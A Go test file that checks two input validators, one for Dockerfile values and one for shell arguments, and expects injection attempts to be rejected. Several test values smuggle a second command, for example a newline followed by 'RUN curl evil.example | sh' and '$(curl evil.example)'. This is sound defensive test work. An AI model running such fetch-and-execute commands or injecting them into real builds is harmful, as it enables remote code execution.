// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package util

import "testing"

func TestValidateDockerfileSafe(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		{name: "plain identifier", value: "myserver", wantErr: false},
		{name: "path with slashes and dots", value: "cmd/quickstart/main.go", wantErr: false},
		{name: "url", value: "http://127.0.0.1:8081", wantErr: false},
		{name: "empty string", value: "", wantErr: false},
		{name: "newline breaks out of the current instruction", value: "x\nRUN curl evil.example | sh\n#", wantErr: true},
		{name: "carriage return", value: "x\rRUN curl evil.example | sh", wantErr: true},
		{name: "double quote breaks out of a CMD JSON-array string", value: `x", "extra"]`, wantErr: true},
		{name: "backtick", value: "x`whoami`", wantErr: true},
		{name: "NUL byte", value: "x\x00y", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateDockerfileSafe(tt.value, "test value")
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateDockerfileSafe(%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
			}
		})
	}
}

func TestValidateShellArgSafe(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		{name: "plain identifier", value: "myserver", wantErr: false},
		{name: "path with slashes and dots", value: "cmd/quickstart/main.go", wantErr: false},
		{name: "empty string", value: "", wantErr: false},
		{name: "semicolon command separator", value: "main.go; curl evil.example | sh #", wantErr: true},
		{name: "pipe to shell", value: "main.go | sh", wantErr: true},
		{name: "ampersand background/chain", value: "main.go && curl evil.example", wantErr: true},
		{name: "command substitution", value: "$(curl evil.example)", wantErr: true},
		{name: "backtick command substitution", value: "`curl evil.example`", wantErr: true},
		{name: "space", value: "main go", wantErr: true},
		{name: "newline", value: "x\nRUN curl evil.example | sh\n#", wantErr: true},
		{name: "double quote", value: `x"`, wantErr: true},
		{name: "url is rejected (not a path)", value: "http://127.0.0.1:8081", wantErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateShellArgSafe(tt.value, "test value")
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateShellArgSafe(%q) error = %v, wantErr %v", tt.value, err, tt.wantErr)
			}
		})
	}
}
